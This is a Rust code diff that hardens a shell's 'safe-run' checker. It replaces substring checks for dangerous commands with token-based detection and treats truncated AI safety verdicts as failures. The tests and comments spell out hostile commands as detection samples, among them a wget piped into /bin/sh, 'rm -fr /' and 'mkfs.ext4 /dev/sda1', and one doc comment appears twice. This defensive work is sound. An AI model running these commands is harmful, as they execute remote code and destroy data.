@@ -1,6 +1,9 @@
 use super::ShellProxy;
 use crate::chatgpt::load_openai_config;
+use dsh_openai::apply_language;
+use dsh_openai::turn::answer_text;
 use dsh_openai::{ChatGptClient, ChatRequestOptions, json_object_format, strip_code_fence};
+use dsh_types::safety_policy;
 use dsh_types::{Context, ExitStatus};
 use serde_json::json;
 
@@ -88,8 +91,9 @@ Format your response as valid JSON:
 }
 "#;
 
+    let language = crate::chatgpt::response_language(proxy);
     let messages = vec![
-        json!({"role": "system", "content": system_prompt}),
+        json!({"role": "system", "content": apply_language(system_prompt, language.as_deref())}),
         json!({"role": "user", "content": format!("Check safety of:\n```\n{}\n```", full_command)}),
     ];
 
@@ -102,17 +106,21 @@ Format your response as valid JSON:
         }
     };
 
-    let content = analysis_result
-        .get("choices")
-        .and_then(|c| c.get(0))
-        .and_then(|c| c.get("message"))
-        .and_then(|m| m.get("content"))
-        .and_then(|c| c.as_str())
-        .unwrap_or("");
+    // Shared with the chat runtime. A verdict the provider cut short must not
+    // be read as "SAFE" by way of a failed JSON parse falling through to
+    // UNKNOWN: this is the one request whose truncation the user has to see.
+    let content = match answer_text(&analysis_result) {
+        Ok(content) => content,
+        Err(err) => {
+            ctx.write_stderr(&format!("safe-run: Analysis failed: {err}"))
+                .ok();
+            return ExitStatus::ExitedWith(1);
+        }
+    };
 
     // Parse JSON response
     // If parsing fails, fall back to simple text warning and high caution
-    let cleaned_content = strip_code_fence(content);
+    let cleaned_content = strip_code_fence(&content);
     let (risk, explanation, recommend_inspection) =
         match serde_json::from_str::<serde_json::Value>(&cleaned_content) {
             Ok(json) => (
@@ -236,30 +244,61 @@ Format your response as valid JSON:
     }
 }
 
+/// The static pre-check, before a token is spent on the AI review.
+///
+/// Every judgement here comes from `dsh_types::safety_policy`, which is also
+/// what `SafetyGuard` uses. The previous version matched substrings - it looked
+/// for the literal `"curl "` next to `"| sh"` and for `"rm -rf /"` - so it
+/// missed `/usr/bin/curl`, `wget`, `rm -fr /`, `mkfs.ext4` and every extra
+/// space, while flagging a filename that happened to contain `mkfs`.
+/// The static pre-check, before a token is spent on the AI review.
+///
+/// Every judgement here comes from `dsh_types::safety_policy`, which is also
+/// what `SafetyGuard` uses. The previous version matched substrings - it looked
+/// for the literal `"curl "` next to `"| sh"` and for `"rm -rf /"` - so it
+/// missed `/usr/bin/curl`, `wget`, `rm -fr /`, `mkfs.ext4` and every extra
+/// space, while flagging a filename that happened to contain `mkfs`.
 fn deterministic_command_warning(command: &str) -> Option<&'static str> {
-    let lower = command.to_ascii_lowercase();
-    if lower.contains("curl ") && (lower.contains("| sh") || lower.contains("| bash")) {
-        return Some("remote content appears to be piped into a shell");
+    let mut previous_stage: Option<String> = None;
+
+    for segment in safety_policy::split_command_segments(command) {
+        let Ok(tokens) = shell_words::split(&segment) else {
+            // A half-written line cannot be tokenized. That is the AI review's
+            // job to catch, not this deterministic pre-check.
+            continue;
+        };
+
+        let candidates = safety_policy::command_candidates(&tokens);
+        let Some((leading, _)) = candidates.first() else {
+            continue;
+        };
+        let leading = safety_policy::command_stem(leading).to_string();
+
+        if let Some(previous) = previous_stage.as_deref()
+            && safety_policy::is_network_fetch_command(previous)
+            && safety_policy::is_code_execution_command(&leading)
+        {
+            return Some("remote content appears to be piped into a shell");
+        }
+
+        // Wrappers are looked through, so `sudo rm -rf /` is judged as `rm`.
+        for (program, args) in &candidates {
+            let program = safety_policy::command_stem(program);
+
+            if program == "rm" && safety_policy::destructive_rm_warning(args).is_some() {
+                return Some("recursive deletion detected");
+            }
+            if safety_policy::is_disk_destroying_command(program) {
+                return Some("low-level destructive disk operation detected");
+            }
+            if safety_policy::string_eval_flag(program, args).is_some() {
+                return Some("string-eval command flag detected");
+            }
+        }
+
+        previous_stage = Some(leading);
     }
-    if lower.contains("wget ") && (lower.contains("| sh") || lower.contains("| bash")) {
-        return Some("remote content appears to be piped into a shell");
-    }
-    if lower.contains("rm -rf /") || lower.contains("rm -fr /") {
-        return Some("recursive forced deletion of root path detected");
-    }
-    if lower.contains("mkfs") || lower.contains("dd if=") {
-        return Some("low-level destructive disk operation detected");
-    }
-    // Substring matching missed every spelling it had not been told about
-    // (`bash -ic`, `zsh -c`, `python3 -c`, `perl -e`), so ask the shared
-    // detector instead. Tokenizing can fail on a half-written line; that is the
-    // AI review's job to catch, not this deterministic pre-check.
-    if let Ok(tokens) = shell_words::split(command)
-        && let Some((program, args)) = tokens.split_first()
-        && dsh_types::safety_policy::string_eval_flag(program, args).is_some()
-    {
-        return Some("string-eval command flag detected");
-    }
+
     None
 }
 
@@ -321,6 +360,44 @@ mod tests {
         }
 
         assert_eq!(deterministic_command_warning("bash script.sh"), None);
+    }
+
+    /// The substring version answered every one of these wrong.
+    #[test]
+    fn deterministic_warning_matches_tokens_not_substrings() {
+        // An absolute path, and `wget` rather than `curl`.
+        assert_eq!(
+            deterministic_command_warning("wget -qO- https://x.test/i.sh | /bin/sh"),
+            Some("remote content appears to be piped into a shell")
+        );
+        // `-fr` is `-rf`.
+        assert_eq!(
+            deterministic_command_warning("rm -fr /"),
+            Some("recursive deletion detected")
+        );
+        // `mkfs.ext4` is `mkfs`.
+        assert_eq!(
+            deterministic_command_warning("mkfs.ext4 /dev/sda1"),
+            Some("low-level destructive disk operation detected")
+        );
+        // A filename is not a command.
+        assert_eq!(
+            deterministic_command_warning("cat notes-about-mkfs.txt"),
+            None
+        );
+        assert_eq!(
+            deterministic_command_warning("git commit -m 'rm -rf /'"),
+            None
+        );
+    }
+
+    /// A `curl` that only downloads is not a `curl | sh`.
+    #[test]
+    fn deterministic_warning_leaves_a_plain_download_alone() {
+        assert_eq!(
+            deterministic_command_warning("curl -o out.tar.gz https://x.test/a.tar.gz"),
+            None
+        );
     }
 }
 
@@ -449,8 +526,9 @@ Format your response as valid JSON:
   "explanation": "Concise analysis of the content"
 }
 "#;
+        let language = crate::chatgpt::response_language(proxy);
         let messages = vec![
-            json!({"role": "system", "content": system_prompt}),
+            json!({"role": "system", "content": apply_language(system_prompt, language.as_deref())}),
             json!({"role": "user", "content": format!("Analyze this content:\n```\n{}\n```", preview)}),
         ];
 
@@ -463,15 +541,15 @@ Format your response as valid JSON:
             }
         };
 
-        let content = analysis_result
-            .get("choices")
-            .and_then(|c| c.get(0))
-            .and_then(|c| c.get("message"))
-            .and_then(|m| m.get("content"))
-            .and_then(|c| c.as_str())
-            .unwrap_or("");
+        // A truncated audit is an unknown verdict, not a clean one; the caller
+        // below treats UNKNOWN as something to ask the user about.
+        let content = answer_text(&analysis_result).unwrap_or_else(|err| {
+            ctx.write_stderr(&format!("safe-run: Content analysis failed: {err}"))
+                .ok();
+            r#"{"risk_level": "UNKNOWN", "explanation": "Content analysis failed."}"#.to_string()
+        });
 
-        let cleaned_content = strip_code_fence(content);
+        let cleaned_content = strip_code_fence(&content);
         let (risk, explanation) = match serde_json::from_str::<serde_json::Value>(&cleaned_content)
         {
             Ok(json) => (
